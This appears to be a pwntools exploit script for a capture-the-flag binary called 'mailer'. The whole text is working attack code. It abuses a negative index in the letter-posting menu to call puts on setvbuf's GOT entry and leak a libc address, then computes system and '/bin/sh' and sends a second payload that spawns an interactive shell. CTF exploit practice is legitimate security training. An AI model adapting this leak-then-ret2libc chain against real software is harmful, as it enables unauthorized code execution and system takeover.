from pwn import *

r = process("./mailer")

'''
script = "c"
gdb.attach(r, script)
'''

def addLetter(contents):
	r.sendline("1")
	print r.recvuntil("contents: ")
	r.sendline(contents)
	print r.recvuntil("> ")

def deleteLetter(idx):
	r.sendline("2")
	print r.recvuntil(": ")
	r.sendline(str(idx))
	print r.recvuntil("> ")

def postLetter(idx, func):
	r.sendline("3")
	print r.recvuntil(": ")
	r.sendline(str(idx))
	print r.recvuntil("> ")
	r.sendline(str(func))
	print r.recvuntil("> ")

sleep(2)
raw_input("$")

print r.recvuntil("> ")

payload = "A"*18
payload += p32(0x8048530) # puts@plt
payload += p32(0x8048d01) # main
payload += p32(0x804b00c) # setvbuf@got

addLetter(payload)

for _ in xrange(4):
	addLetter("A"*250)

postLetter(4, -15)

postLetter(1, 0)
postLetter(0, 0)

print payload

r.send("4\n")
print r.recvuntil("service :)\n")

libc = u32(r.recv(4))
libc_base = libc - 0x65ff0
system = libc_base + 0x3ada0
binsh = libc_base + 0x15b9ab

print "libc: " + hex(libc)

print r.recvuntil("> ")

payload = "A"*18
payload += p32(system)
payload += "BBBB"
payload += p32(binsh)

addLetter(payload)

for _ in xrange(4):
        addLetter("A"*250)

postLetter(4, -15)

postLetter(1, 0)
postLetter(0, 0)

r.sendline("4")

r.interactive()
